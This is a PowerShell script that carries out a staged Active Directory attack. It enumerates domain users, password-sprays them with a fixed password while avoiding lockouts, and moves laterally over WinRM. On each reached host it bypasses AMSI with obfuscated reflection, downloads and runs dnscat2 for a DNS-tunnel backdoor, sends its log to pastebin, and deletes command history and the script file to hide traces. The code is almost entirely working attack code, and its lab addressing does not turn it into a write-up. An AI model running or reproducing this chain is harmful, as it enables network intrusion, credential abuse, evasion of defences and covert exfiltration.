
# Initialize log variable
$global:logContent = @()

function LDAPSearch {
    param (
        [string]$LDAPQuery
    )
    $PDC = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PdcRoleOwner.Name
    $DistinguishedName = ([adsi]'').distinguishedName
    $DirectoryEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$PDC/$DistinguishedName")
    $DirectorySearcher = New-Object System.DirectoryServices.DirectorySearcher($DirectoryEntry, $LDAPQuery)

    return $DirectorySearcher.FindAll()
}

function Log {
    param (
        [string]$Message,
        [string]$Type = "INFO"
    )
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $logMessage = "[$timestamp] [$Type] $Message"
    $global:logContent += $logMessage
}


# Stage 1
function GenerateUserList {
    Log "Stage 1: Generating user list."
    $queryResults = LDAPSearch -LDAPQuery "(&(objectCategory=person)(objectClass=user))"
    $users = @()
    $domainRoot = [ADSI]""
    $lockoutThreshold = $domainRoot.lockoutThreshold.Value
    Log "Lockout threshold retrieved: $lockoutThreshold."
    foreach ($user in $queryResults) {
        $username = $user.Properties["samaccountname"][0]
        $badpwdcount = $user.Properties["badpwdcount"][0]
        $excludedUsers = @("Guest", "krbtgt", "Administrator", "DefaultAccount", "WDAGUtilityAccount")
        if ($excludedUsers.Contains($username)) {
            Log "Skipping $username because it is an excluded user. Skipping..."
            continue
        }
        if ($null -eq $badpwdcount) {
            Log "Couldnt find $username bad password count. Skipping..."
            continue
        }
        if (($badpwdcount + 1) -ge $lockoutThreshold) {
            Log "User $username has $badpwdcount bad password attempts. Skipping..."
            continue
        }
        else {
            Log "Added user $username to user list."
            $users += $username
        }
    }
    return $users
}


# Stage 2
function PasswordSpray {
    param (
        [array]$Users,
        [string]$Password
    )
    Log "Stage 2: Performing password spray."
    $validUsers = @()
    foreach ($currentUser in $Users) {
        try {
            $Domain = "LDAP://" + ([adsi]"").distinguishedName
            $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain, $currentUser, $Password)
            if ($null -ne $Domain_check.name) {
                Log "SUCCESS! User:$currentUser Password:$Password" "SUCCESS"
                $validUsers += $currentUser
            }
            else {
                Log "Invalid credentials for $currentUser"
            }
        }
        catch {
            Log "Unkown Error: $($_.Exception.Message)" "ERROR"
        }
    }
    return $validUsers
}

# Stage 3
function LateralMovement {
    param (
        [array]$Users,
        [string]$Password
    )
    Log "Stage 3: Creating PS-Remoting sessions on computers with open WinRM port."
    $winrmPort = 5985
    $validComputers = LDAPSearch -LDAPQuery "(objectCategory=computer)" | ForEach-Object {
        $_.Properties.name
    } | ForEach-Object {
        if ((Test-NetConnection -ComputerName $_ -Port $winrmPort -WarningAction SilentlyContinue).TcpTestSucceeded) {
            Log "WinRM port open on computer: $_." 
            return $_
        }
        else {
            Log "WinRM port closed on computer: $_."
        }   
    }

    if ($validComputers.Count -eq 0) {
        Log "No Computers with open PowerShell remoting port found." "ERROR"
        return
    }

    Log "Computers $($validComputers -join ', ') are open to PowerShell remoting." "SUCCESS"
        
    $sessions = @()
    foreach ($user in $Users) {
        foreach ($computer in $validComputers) {
            $credentials = New-Object System.Management.Automation.PSCredential -ArgumentList @("$user", (ConvertTo-SecureString -String $Password -AsPlainText -Force))
            try {
                $session = New-PSSession -ComputerName $computer -Credential $credentials -ErrorAction Stop
                Log "Successfully connected to $computer with user $user." "SUCCESS"    
                $sessions += $session
            }
            catch {
                Log "Failed PS-Remoting on $computer with user $user. Error: $_.Exception.Message" "ERROR"
            }
        }
    }
    return $sessions
}

# Stage 4
function ExecuteDNSTunneling {
    param (
        [array]$sessions
    )
    Log "Stage 4: Executing DNS tunneling persistence."
    foreach ($session in $sessions) {
        try {
            $job = Invoke-Command -Session $session -ScriptBlock {
                $a = 'si'; $b = 'Am'; $Ref = [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f $b, $a)); $z = $Ref.GetField(('am{0}InitFailed' -f $a),'NonPublic,Static'); $z.("Set" + "Value")($null,$true)
                Invoke-Expression (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/master/dnscat2.ps1')
                Start-Dnscat2 -Domain "test" -DNSServer 192.168.56.1
            } -AsJob
            Log "Started DNS tunneling job with ID: $($job.Id) and Status: $($job.State) on session $($session.ComputerName)" "SUCCESS"
        }
        catch {
            Log "Failed to execute DNS tunneling persistence on $($session.ComputerName). Error: $($_.Exception.Message)" "ERROR" 
        }
    }
}


# Main Execution
Log "Script started."

# Stage 1
$users = GenerateUserList

# Stage 2
if ($users) {
    $validUsers = PasswordSpray -Users $users -Password "FightP3aceAndHonor!" 
}

# Stage 3
if ($validUsers) {
    $sessions = LateralMovement -Users $validUsers -Password "FightP3aceAndHonor!" 
}

# Stage 4
if ($sessions) {
    ExecuteDNSTunneling -sessions $sessions
}

Log "Script finished."

# Stage 5 
$logContentString = $logContent -join "`n"
$api_dev_key = '<your_api_key>'
$api_paste_code = $logContentString
$api_paste_name = "chain-attack-logger-$(Get-Date -Format "yyyy-MM-dd").txt"

$body = @{
    api_option     = 'paste'
    api_dev_key    = $api_dev_key
    api_paste_code = $api_paste_code
    api_paste_name = $api_paste_name
}
Invoke-RestMethod -Uri 'https://pastebin.com/api/api_post.php' -Method Post -Body $body | Out-Null

# Remove Traces
Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction Ignore | Out-Null
Remove-Item -Path $MyInvocation.MyCommand.Definition -Force -ErrorAction Ignore | Out-Null
